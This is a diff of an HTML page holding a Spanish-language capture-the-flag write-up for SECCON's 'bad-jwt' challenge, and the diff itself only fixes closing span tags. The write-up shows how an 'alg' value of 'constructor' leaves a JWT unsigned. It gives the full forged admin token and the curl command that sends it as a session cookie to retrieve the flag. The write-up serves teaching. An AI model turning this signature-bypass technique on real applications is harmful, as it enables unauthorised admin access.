@@ -221,7 +221,7 @@ Type ".help" for more information.
 &gt; createSignature({ alg: 'hs256' }, { isAdmin: true }, secret)
 <span class="code-dark-green">'LNBaw1lmC_QGltCbDRDwQXkr3A_K-Y4m8lUBhKhZKXU'</span>
 &gt; createSignature({ alg: 'constructor' }, { isAdmin: true }, secret)
-<span class="code-dark-green">[String: 'eyJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ']
+<span class="code-dark-green">[String: 'eyJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ']</span>
 </code></pre></div><p>¿Ves las diferencias? El segundo solo genera la <em>string</em> <code>&lt;header>.&lt;payload></code> del <em>token</em> JWT, sin firmar en absoluto. Esto sucede porque estamos ejecutando <code>constructor(data, secret)</code>, que es solo la cadena <code>data</code>.</p><p>Y hay otro problema en <code>Buffer.from(calculated_signature, 'base64')</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt; const calculated_signature = createSignature({ alg: 'constructor' }, { isAdmin: true }, secret);
 <span class="code-grey">undefined</span>
 &gt; calculated_signature
@@ -233,7 +233,7 @@ Type ".help" for more information.
 &gt; calculated_buf.toString()
 <span class="code-dark-green">'{"alg":"constructor"}{"isAdmin":true}'</span>
 </code></pre></div><p>Como se puede ver, la parte de <code>[String: </code>se omite, al igual que <code>.</code>, <code>'</code> y <code>]</code>, que no son una caracteres válidos en Base64. Como resultado, solo necesitamos codificar la cadena anterior en Base64:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt; base64UrlEncode(calculated_buf.toString())
-<span class="code-dark-green">'eyJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ'  
+<span class="code-dark-green">'eyJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ'</span>  
 </code></pre></div><p>Esta será la parte de la firma. Y el <em>token</em> JWT completo es solamente:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">eyJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ.eyJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ  
 </code></pre></div><h2 id="_flag_"><em>Flag</em></h2><p>Si usamos este token JWT como cookie <code>session</code>, obtendremos la <em>flag</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> bad-jwt.seccon.games:3000 -b <span class="code-dark-green">'session=eyJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ.eyJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ'</span>  
 SECCON{Map_and_Object.prototype.hasOwnproperty_are_good}
